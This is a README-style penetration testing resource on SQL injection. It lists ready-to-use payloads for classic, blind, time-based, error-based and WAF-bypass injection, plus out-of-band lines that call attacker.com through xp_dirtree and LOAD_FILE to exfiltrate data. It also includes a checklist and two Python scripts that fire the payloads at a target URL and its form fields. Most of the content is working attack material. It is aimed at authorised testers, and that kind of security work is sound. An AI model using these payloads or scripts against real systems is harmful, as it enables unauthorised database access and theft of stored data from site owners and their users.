# 💉 SQL Injection (SQLi) - Penetration Testing Resource

## 📌 Table of Contents

- [About](#about)
- [Types of SQL Injection](#types-of-sql-injection)
- [Testing Methodology](#testing-methodology)
- [Payload Categories](#payload-categories)
  - [Classic Injection](#classic-injection)
  - [Blind SQL Injection](#blind-sql-injection)
  - [Time-Based Injection](#time-based-injection)
  - [Error-Based Injection](#error-based-injection)
  - [Out-of-Band Injection](#out-of-band-injection)
  - [WAF Bypass](#waf-bypass)
- [Tools](#tools)
- [Manual Testing Checklist](#manual-testing-checklist)
- [Automation Scripts](#automation-scripts)
- [Learning Labs](#learning-labs)
- [References](#references)
- [Legal Disclaimer](#legal-disclaimer)
- [Author](#author)

---

## 🧠 About

SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This repo is created for penetration testers, red teamers, and cybersecurity researchers to help detect and exploit SQL injection vulnerabilities during authorized testing engagements.

---

## 🧬 Types of SQL Injection

| Type                     | Description |
|--------------------------|-------------|
| Classic SQLi             | Injection that directly manipulates SQL queries via user input |
| Blind SQLi               | No direct output from database, attacker infers logic via true/false responses |
| Error-Based SQLi         | Exploits verbose error messages to gather database information |
| Time-Based Blind SQLi    | Infers responses by forcing delays (e.g., SLEEP) |
| Out-of-Band SQLi         | Uses alternate channels (e.g., DNS, HTTP) for data exfiltration |
| Second-Order SQLi        | Malicious input stored and later executed in a different context |

---

## 🧪 Testing Methodology

1. **Reconnaissance**
   - Crawl the application
   - Identify input points (forms, URLs, headers)

2. **Inject Test Payloads**
   - `' OR '1'='1`
   - `--`, `#`, `/* */` to terminate queries

3. **Observe Behavior**
   - Errors, unexpected behavior, delays

4. **Escalate**
   - Try to extract database names, table structures, data

5. **Automation**
   - Use `sqlmap` or scripts for faster exploitation

---

## 🚀 Payload Categories

### 🔹 Classic Injection
sql
' OR '1'='1' --
' OR 1=1#
admin' --
' OR '' = '
### 🔹 Blind SQL Injection
' AND 1=1 --  (TRUE)
' AND 1=2 --  (FALSE)

' AND ASCII(SUBSTRING(@@version, 1, 1))=77 -- (Check first letter of version)
###🔹 Time-Based Injection
'; IF(1=1) WAITFOR DELAY '0:0:5' --
'; SLEEP(5) --
' AND IF(1=1, SLEEP(5), 0) --
### 🔹 Error-Based Injection
' AND 1=CONVERT(int, (SELECT @@version))--
' OR (SELECT 1/0)--
###🔹 Out-of-Band Injection
'; exec master..xp_dirtree '//attacker.com/test' --
'; LOAD_FILE('\\\\attacker.com\\file') --
###🔹 WAF Bypass
' OR 1=1-- 
' oR 1=1-- 
'/*!50000OR*/1=1--
' OR 1=1 LIMIT 1--
%27%20OR%201=1--


## 🛠️ Tools
Burp Suite – Manual testing, Repeater, Intruder, Collaborator

SQLMap – Automated SQL injection and database takeover

NoSQLMap – Testing NoSQL injections

Postman – API SQLi

Nmap – Service detection

ffuf / wfuzz – Fuzzing endpoints

✅ Manual Testing Checklist
Step	Test	Payload Example
✅	Basic Injection	' OR '1'='1
✅	Input Field	Inject single '
✅	Boolean Test	' AND 1=1 -- vs ' AND 1=2 --
✅	Time-Based	' AND SLEEP(5)--
✅	Header Injection	User-Agent: ' OR 1=1--
✅	Cookie Injection	Set-Cookie: ID=1' OR '1'='1
✅	Error Feedback	Trigger with ' or "
✅	Bypass Filters	Obfuscate keywords with case or comments

## Automation Scripts
### sqli_scanner.py
import requests

URL = "http://target.com/page?id="
payloads = ["1'", "' OR '1'='1", "'; WAITFOR DELAY '0:0:5'--"]

for payload in payloads:
    target = URL + payload
    r = requests.get(target)
    print(f"[+] {payload} => {r.status_code} | {len(r.text)} chars")
### form_fuzzer.py
from bs4 import BeautifulSoup
import requests

url = "http://target.com/formpage"
payload = "' OR 1=1--"
session = requests.Session()

r = session.get(url)
soup = BeautifulSoup(r.text, 'html.parser')
form = soup.find('form')
action = form.get('action')
inputs = form.find_all('input')

data = {inp.get('name'): payload for inp in inputs if inp.get('name')}
post_url = url + action
resp = session.post(post_url, data=data)
print(resp.text)
